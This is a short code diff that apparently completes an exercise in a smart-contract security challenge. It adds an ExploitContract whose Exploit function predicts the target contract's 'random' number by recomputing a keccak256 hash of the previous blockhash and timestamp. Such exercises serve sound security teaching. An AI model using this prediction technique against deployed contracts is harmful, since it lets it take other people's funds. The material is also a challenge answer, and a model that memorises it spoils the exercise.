@@ -25,9 +25,9 @@ contract GuessNewNumber {
 //Write your exploit codes below
 contract ExploitContract {
     GuessNewNumber public guessNewNumber;
-    uint8 public answer;
 
-    function Exploit() public returns (uint8) {
-        return answer;
+    function Exploit() public view returns (uint8 answer) {
+        // Reimplement the logic of the guess function
+        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
     }
 }
